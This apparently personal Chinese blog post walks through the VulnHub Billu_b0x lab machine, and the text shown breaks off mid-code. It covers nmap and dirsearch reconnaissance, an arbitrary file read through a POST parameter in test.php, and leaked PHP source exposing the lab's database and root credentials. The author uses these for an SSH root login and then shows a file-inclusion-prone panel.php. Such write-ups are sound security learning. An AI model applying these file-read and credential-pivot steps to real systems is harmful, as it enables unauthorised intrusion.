            "content_html": "<h2 id=\"vulnhub靶机学习billu_b0x实战记录\"><a class=\"anchor\" href=\"#vulnhub靶机学习billu_b0x实战记录\">#</a> VulnHub 靶机学习 ——Billu_b0x 实战记录</h2>\n<h3 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h3>\n<p>说起来应该算是第一次打这样的靶机，虽然没有独立完成，但是还是学到不少东西，也不知道算是什么难度的反正是看着网上大佬的方法打通了</p>\n<h3 id=\"靶机说明\"><a class=\"anchor\" href=\"#靶机说明\">#</a> 靶机说明</h3>\n<p>目标是获取 root 权限</p>\n<p>环境介绍：攻击机 win10、kail Linux</p>\n<p>​\t\t\t\t\t靶机 billu_b0x (运行与 VMware 中)</p>\n<p>网路设置：VM 中均为 Nat 连接模式（否则 nmap 扫不到存活主机）</p>\n<h3 id=\"过程记录\"><a class=\"anchor\" href=\"#过程记录\">#</a> 过程记录</h3>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>启动靶机这不必多说</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725200859598.png\" alt=\"image-20220725200859598\" /></p>\n<p>先用 nmap 扫描，找到这个靶机的 ip 地址</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725201302238.png\" alt=\"image-20220725201302238\" /></p>\n<p>扫描这个网段存活主机</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725201148762.png\" alt=\"image-20220725201148762\" /></p>\n<p>发现开放了 80 和 22 端口，那么 ssh 和 http 都有了先看看 80 都有什么</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725202635615.png\" alt=\"image-20220725202635615\" /></p>\n<p>看到登录框，但是没有发现 SQL 注入，用 dirsearch 扫描</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725202855639.png\" alt=\"image-20220725202855639\" /></p>\n<p>看到文件很多，先看看都是实现什么功能的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725202956010.png\" alt=\"image-20220725202956010\" /></p>\n<p>add 上传文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725203042625.png\" alt=\"image-20220725203042625\" /></p>\n<p>head.php 是首页的背景图片</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725203140837.png\" alt=\"image-20220725203140837\" /></p>\n<p>images 是三张图片没发现能利用的东西</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725203252626.png\" alt=\"image-20220725203252626\" /></p>\n<p>phpmy 是 phpmyadmin 数据库工具</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725211429058.png\" alt=\"image-20220725211429058\" /></p>\n<p>in.php 是 phpinfo，知道了 php 版本，暂时未发现作用</p>\n<p>panel 会被重定向暂时不知道是什么</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725203751630.png\" alt=\"image-20220725203751630\" /></p>\n<p>test 文件提示，要传参 file，感觉这里可能会有任意文件读取 get 传参没反应，post 传参读取 etc/password</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725210934542.png\" alt=\"image-20220725210934542\" /></p>\n<p>读取成功，这里尝试读取其他文件</p>\n<h4 id=\"任意文件读取利用\"><a class=\"anchor\" href=\"#任意文件读取利用\">#</a> 任意文件读取利用</h4>\n<p>add.php</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;form  method=\"post\" enctype=\"multipart/form-data\">\n    Select image to upload:\n    &lt;input type=\"file\" name=image>\n\t&lt;input type=text name=name value=\"name\">\n\t&lt;input type=text name=address value=\"address\">\n\t&lt;input type=text name=id value=1337 >\n    &lt;input type=\"submit\" value=\"upload\" name=\"upload\">\n&lt;/form>'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>c.php（里面发现数据库的账号密码，可以使用）</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">#header( 'Z-Powered-By:its chutiyapa xD' );</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'X-Frame-Options: SAMEORIGIN'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'Server:testing only'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'X-Powered-By:testing only'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'session.cookie_httponly'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"billu\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"b0x_billu\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"ica_lab\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Check connection</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_connect_errno</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"connection failed ->  \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>show.php</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'c.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'continue'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$run</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'select * from users '</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$run</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;table width=90% >&lt;tr>&lt;td>ID&lt;/td>&lt;td>User&lt;/td>&lt;td>Address&lt;/td>&lt;td>Image&lt;/td>&lt;/tr>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n   <span class=\"token punctuation\">&#123;</span>\n\t   <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;tr>&lt;td>'</span><span class=\"token operator\">.</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/td>&lt;td>'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant\">ENT_COMPAT</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/td>&lt;td>'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'address'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant\">ENT_COMPAT</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/td>&lt;td>&lt;img src=\"uploaded_images/'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant\">ENT_COMPAT</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" height=90px width=100px>&lt;/td>&lt;/tr>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n   <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/table>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h4 id=\"法一ssh连接\"><a class=\"anchor\" href=\"#法一ssh连接\">#</a> 法一，ssh 连接</h4>\n<p>因为其 22 端口开放，读取 PHP 默认配置文件是 config.inc.php，Linux 系统路径结合 phpmy，./phpmy/config.inc.php 直接查看账户信息</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\">/* Servers configuration */</span>\n<span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/* Server: localhost [1] */</span>\n<span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verbose'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'host'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'port'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'socket'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'connect_type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'tcp'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'extension'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'mysqli'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'auth_type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'cookie'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'roottoor'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'AllowNoPassword'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/* End of servers configuration */</span>\n\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'DefaultLang'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'en-utf-8'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ServerDefault'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'UploadDir'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SaveDir'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token comment\">/* rajk - for blobstreaming */</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'bs_garbage_threshold'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">50</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'bs_repository_threshold'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'32M'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'bs_temp_blob_timeout'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">600</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'bs_temp_log_threshold'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'32M'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>看到 root 的账号密码用 ssh 连接</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725212737642.png\" alt=\"image-20220725212737642\" /></p>\n<h4 id=\"法二文件上传\"><a class=\"anchor\" href=\"#法二文件上传\">#</a> 法二，文件上传</h4>\n<p>通过上面找到的账号密码登录 phpmyadmin</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726101939920.png\" alt=\"image-20220726101939920\" /></p>\n<p>在 ica_lab 的数据库表中得到的用户名 biLLu 和密码 hEx_it</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726102053357.png\" alt=\"image-20220726102053357\" /></p>\n<p>去在首页登录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726102217542.png\" alt=\"image-20220726102217542\" /></p>\n<p>跳转到 panel 页面</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'c.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'head2.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'logged'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token constant boolean\">true</span> <span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Location: index.php'</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token number\">302</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n<span class=\"token punctuation\">&#125;</span>\n\n\n\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Welcome to billu b0x \"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;form method=post style=\"margin: 10px 0px 10px 95%;\">&lt;input type=submit name=lg value=Logout>&lt;/form>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'lg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'logged'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Location: index.php'</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token number\">302</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;hr>&lt;br>'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;form method=post>\n\n&lt;select name=load>\n    &lt;option value=\"show\">Show Users&lt;/option>\n\t&lt;option value=\"add\">Add User&lt;/option>\n&lt;/select> \n\n &amp;nbsp&lt;input type=submit name=continue value=\"continue\">&lt;/form>&lt;br>&lt;br>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'continue'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$dir</span><span class=\"token operator\">=</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$choice</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'load'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$choice</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'add'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n       \t\t<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$choice</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$choice</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'show'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n        \n\t\t<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$choice</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'load'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t\n\t<span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$address</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'address'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$id</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span 